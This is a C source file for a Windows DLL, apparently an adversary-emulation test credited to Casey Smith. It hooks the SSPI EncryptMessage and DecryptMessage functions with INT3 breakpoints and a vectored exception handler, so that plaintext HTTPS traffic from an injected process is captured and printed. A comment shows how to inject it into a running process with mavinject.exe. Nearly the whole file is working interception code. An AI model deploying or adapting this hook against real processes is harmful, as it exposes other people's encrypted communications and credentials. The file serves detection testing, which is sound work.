#define SECURITY_WIN32 //Define First Before Imports.

#include <windows.h>
#include <stdio.h>
#include <Sspi.h> //Be sure to reference secur32.lib in Linker | Input | Additional Dependencies

FARPROC fpEncryptMessage; //Pointer To The Original Location
BYTE bSavedByte; //Saved Byte Overwritten by 0xCC -

FARPROC fpDecryptMessage; //Pointer To The Original Location
BYTE bSavedByte2; //Saved Byte Overwritten by 0xCC -


				  // Original Idea/Reference Blog Post Here:
				  // https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
				  // PoC by Casey Smith @subTee
				  // From PowerShell
				  // mavinject.exe $pid /INJECTRUNNING C:\AtomicTests\AtomicSSLHookx64.dll
				  // curl https://www.example.com
				  // Should Hook and Display Request/Response from HTTPS




BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
	DWORD dwOldProt = 0;
	if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE)
		return FALSE;

	MoveMemory(fpFunc, b, size);

	return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
}

//TODO, Combine  HOOK Function To take 2 params. DLL and Function Name.
VOID HookFunction(VOID) {
	fpEncryptMessage = GetProcAddress(LoadLibraryW(L"sspicli.dll"), "EncryptMessage");
	if (fpEncryptMessage == NULL) {
		return;
	}

	bSavedByte = *(LPBYTE)fpEncryptMessage;

	const BYTE bInt3 = 0xCC;
	if (WriteMemory(fpEncryptMessage, &bInt3, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}
}

VOID HookFunction2(VOID) {
	fpDecryptMessage = GetProcAddress(LoadLibraryW(L"sspicli.dll"), "DecryptMessage");
	if (fpDecryptMessage == NULL) {
		return;
	}

	bSavedByte2 = *(LPBYTE)fpDecryptMessage;

	const BYTE bInt3 = 0xCC;
	if (WriteMemory(fpDecryptMessage, &bInt3, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}
}

SECURITY_STATUS MyEncryptMessage(
	PCtxtHandle    phContext,
	ULONG          fQOP,
	PSecBufferDesc pMessage,
	ULONG          MessageSeqNo
)
{

	char* buffer = (char*)((DWORD_PTR)(pMessage->pBuffers->pvBuffer) + 0x29); //Just Hardcode for PoC


	printf("***HOOKED CAPTURE LOG*** %s", buffer);

	if (WriteMemory(fpEncryptMessage, &bSavedByte, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}

	SECURITY_STATUS SEC_EntryRet = EncryptMessage(phContext, fQOP, pMessage, MessageSeqNo);
	HookFunction();
	return SEC_EntryRet;
}

SECURITY_STATUS MyDecryptMessage(
	PCtxtHandle    phContext,
	PSecBufferDesc pMessage,
	ULONG          MessageSeqNo,
	ULONG          fQOP
)
{

	if (WriteMemory(fpDecryptMessage, &bSavedByte2, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}

	SECURITY_STATUS SEC_EntryRet = DecryptMessage(phContext, pMessage, MessageSeqNo, &fQOP);

	char* buffer = (char*)(pMessage->pBuffers->pvBuffer);


	printf("***HOOKED CAPTURE LOG*** %s", buffer);
	HookFunction2();
	return SEC_EntryRet;
}


LONG WINAPI
MyVectoredExceptionHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{
	UNREFERENCED_PARAMETER(ExceptionInfo);
#ifdef _WIN64
	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpEncryptMessage)
		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyEncryptMessage;

	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpDecryptMessage)
		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyDecryptMessage;

#else
	if (ExceptionInfo->ContextRecord->Eip == (DWORD_PTR)fpEncryptMessage)
		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyEncryptMessage;

	if (ExceptionInfo->ContextRecord->Eip == (DWORD_PTR)fpDecryptMessage)
		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyDecryptMessage;

#endif
	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
		HookFunction();
		HookFunction2();

		printf("Ready To Roll Out!\n");
		break;
	}

	return TRUE;
}
